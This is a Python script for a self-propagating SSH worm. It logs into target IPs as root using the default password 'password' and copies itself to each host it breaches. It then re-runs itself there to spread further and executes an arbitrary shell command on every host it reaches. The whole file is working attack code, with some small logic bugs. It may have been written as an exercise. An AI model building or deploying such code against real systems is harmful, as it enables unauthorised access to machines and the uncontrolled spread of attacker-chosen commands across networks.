#!/usr/bin/env python3

import argparse
import asyncio
import ipaddress
import json
import signal
import sys
from asyncio import CancelledError
from contextlib import suppress

import asyncssh

import settings
from iface import NetworkIface
from utils import LoggerSingleton

logger = LoggerSingleton.get_logger('worm')


class Worm:

    def __init__(self, cmd, target_ips, *, loop=None):
        self.result = {}

        self.cmd = cmd
        self.loop = loop or asyncio.get_event_loop()
        self.host_ips = {iface.host_ip for iface in NetworkIface.get_ifaces()}
        self.target_ips = set(target_ips)

        for sig in (signal.SIGINT, signal.SIGTERM):
            self.loop.add_signal_handler(sig, self.shutdown)

        self.ssh_conns_by_ip = {}

    async def execute_command(self):
        process = await asyncio.create_subprocess_shell(
            self.cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if process.returncode == 0:
            res = stdout.decode().strip()
        else:
            res = stderr.decode().strip()
        return res

    async def infect_host_and_execute(self, conn, hosts_to_resolve):
        # coping worm to the resolved hosts
        await asyncssh.scp(str(settings.BASE_PATH), (conn, '/'), recurse=True)
        # run code on infected host to resolve other ips
        cmd = f'cd {settings.BASE_PATH} && ./worm.py "{self.cmd}" %s --json' % ','.join(map(str, hosts_to_resolve))
        return await conn.run(cmd)

    async def run(self):
        result = {}
        # run command on current host if host ip found in target ips
        intersection_ips = self.host_ips & self.target_ips
        if intersection_ips:
            res = await self.execute_command()
            for ip in intersection_ips:
                result[ip] = res

        # trying to connect to all ips, hopefully we will have at least 1 connection
        target_ips = self.target_ips - self.host_ips
        connection_tasks = []
        for ip in target_ips:
            connection_coroutine = asyncssh.connect(str(ip), username='root',
                                                    password='password', known_hosts=None)
            connection_tasks.append(asyncio.wait_for(connection_coroutine, timeout=1))

        results = await asyncio.gather(*connection_tasks, return_exceptions=True)
        for ip, res in zip(target_ips, results):
            if not isinstance(res, Exception):
                self.ssh_conns_by_ip[ip] = res

        if self.ssh_conns_by_ip:
            # we were able to ssh to some targets
            # try to resolve other hosts through them
            target_ips -= set(self.ssh_conns_by_ip.items())
            infect_hosts_tasks = []
            for conn in self.ssh_conns_by_ip.values():
                infect_hosts_tasks.append(self.infect_host_and_execute(conn, target_ips))

            # check for worm execution result
            infected_results = await asyncio.gather(*infect_hosts_tasks, return_exceptions=True)
            for ip, res in zip(self.ssh_conns_by_ip.keys(), infected_results):
                if isinstance(res, Exception):
                    result[ip] = 'Worm failed'
                    continue

                if res.exit_status == 0:
                    result.update(json.loads(res.stdout.strip()))
                else:
                    result[ip] = res.stderr.strip()

        await self.cleanup_ssh_connections()

        # set result and stop the loop
        self.result = result
        self.stop()

    def start(self):
        self.loop.create_task(self.run())
        try:
            self.loop.run_forever()
        finally:
            self.loop.run_until_complete(self.cleanup())
            self.loop.close()

    def stop(self):
        if self.loop.is_running():
            self.loop.stop()

    def shutdown(self):
        logger.info('Shut down signal received. Processing...')
        self.stop()

    async def cleanup_ssh_connections(self):
        for connection in self.ssh_conns_by_ip.values():
            connection.close()
            await connection.wait_closed()

    async def cleanup(self):
        for task in asyncio.all_tasks(self.loop):
            if task == asyncio.current_task(self.loop):
                continue

            task.cancel()
            with suppress(CancelledError):
                await task

        await self.cleanup_ssh_connections()


def output_result(result, is_json_format=False):
    if is_json_format and result:
        sys.stdout.write(json.dumps(result))
    else:
        for ip in target_ips:
            if ip in result:
                sys.stdout.write(f'{ip} returned: \n{result[ip]}\n')
            else:
                sys.stdout.write(f'{ip} - host unreachable\n\n')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy command to all resolved hosts, execute it and print responses')
    parser.add_argument('cmd', type=str, help='Command')
    parser.add_argument('target_ips', type=str, help='List of ips, separated by comma')
    parser.add_argument('--json', action='store_true', help='Output result as JSON')
    args = parser.parse_args()

    target_ips = args.target_ips.split(',')
    for ip in target_ips:
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            logger.exception('%s is not an address', ip)
            sys.exit(-1)

    worm = Worm(args.cmd, target_ips)
    worm.start()
    output_result(worm.result, args.json)
